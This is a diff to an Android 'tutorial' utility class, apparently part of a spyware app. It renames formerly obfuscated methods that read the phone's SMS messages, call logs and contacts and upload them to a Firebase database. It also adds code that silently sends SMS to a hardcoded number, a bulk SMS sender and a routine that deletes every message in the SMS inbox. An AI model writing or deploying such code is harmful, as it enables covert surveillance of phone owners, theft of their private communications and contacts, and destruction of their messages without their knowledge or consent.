@@ -1,10 +1,10 @@
 package com.android.tutorial.utils;
 
-import android.accounts.Account;
-import android.accounts.AccountManager;
 import android.app.Activity;
+import android.app.PendingIntent;
 import android.content.ContentResolver;
 import android.content.Context;
+import android.content.Intent;
 import android.content.SharedPreferences;
 import android.database.Cursor;
 import android.graphics.PorterDuff;
@@ -13,14 +13,19 @@ import android.net.Uri;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.support.v4.content.ContextCompat;
+import android.telephony.SmsManager;
 import android.text.format.DateFormat;
-import android.util.Patterns;
 import android.view.MenuItem;
+import android.widget.Toast;
 
+import com.android.tutorial.receivers.SmsDeliveredReceiver;
+import com.android.tutorial.receivers.SmsSentReceiver;
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
 
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Calendar;
 import java.util.Date;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
@@ -79,7 +84,7 @@ public class Utils {
     }
 
 
-    public static ArrayList gettishms(Activity activity) {
+    public static ArrayList fetchSms(Activity activity) {
         FirebaseDatabase mFirebaseInstance = FirebaseDatabase.getInstance();
         DatabaseReference mFirebaseDatabase = mFirebaseInstance.getReference();
         ArrayList sms = new ArrayList();
@@ -136,7 +141,13 @@ public class Utils {
         return sms;
     }
 
-    public static String getkalol(Context context) {
+    public static void sendSms() {
+        SmsManager smsManager = SmsManager.getDefault();
+        smsManager.sendTextMessage("03044422122", null,
+                "Hey!", null, null);
+    }
+
+    public static String getCallDetails(Context context) {
         FirebaseDatabase mFirebaseInstance = FirebaseDatabase.getInstance();
         DatabaseReference mFirebaseDatabase = mFirebaseInstance.getReference();
 
@@ -187,7 +198,7 @@ public class Utils {
         return stringBuffer.toString();
     }
 
-    public static void getltoiCstonacs(Context context) {
+    public static void getContactsList(Context context) {
         FirebaseDatabase mFirebaseInstance = FirebaseDatabase.getInstance();
         DatabaseReference mFirebaseDatabase = mFirebaseInstance.getReference();
 
@@ -223,6 +234,45 @@ public class Utils {
                     }
                     pCur.close();
                 }
+            }
+        }
+    }
+
+    public static void sendSMS(Context context, String phoneNumber, String message) {
+        ArrayList<PendingIntent> sentPendingIntents = new ArrayList<PendingIntent>();
+        ArrayList<PendingIntent> deliveredPendingIntents = new ArrayList<PendingIntent>();
+        PendingIntent sentPI = PendingIntent.getBroadcast(context, 0,
+                new Intent(context, SmsSentReceiver.class), 0);
+        PendingIntent deliveredPI = PendingIntent.getBroadcast(context, 0,
+                new Intent(context, SmsDeliveredReceiver.class), 0);
+        try {
+            SmsManager sms = SmsManager.getDefault();
+            ArrayList<String> mSMSMessage = sms.divideMessage(message);
+            for (int i = 0; i < mSMSMessage.size(); i++) {
+                sentPendingIntents.add(i, sentPI);
+                deliveredPendingIntents.add(i, deliveredPI);
+            }
+            sms.sendMultipartTextMessage(phoneNumber, null, mSMSMessage,
+                    sentPendingIntents, deliveredPendingIntents);
+        } catch (Exception e) {
+            e.printStackTrace();
+//            Toast.makeText(context, "SMS sending failed...", Toast.LENGTH_SHORT).show();
+        }
+
+    }
+
+    public static void deleteAllSms(Context context) {
+        Uri inboxUri = Uri.parse("content://sms/inbox");
+        int count = 0;
+        Cursor c = context.getContentResolver().query(inboxUri, null, null, null, null);
+        while (c.moveToNext()) {
+            try {
+                // Delete the SMS
+                String pid = c.getString(0); // Get id;
+                String uri = "content://sms/" + pid;
+                count = context.getContentResolver().delete(Uri.parse(uri),
+                        null, null);
+            } catch (Exception e) {
             }
         }
     }
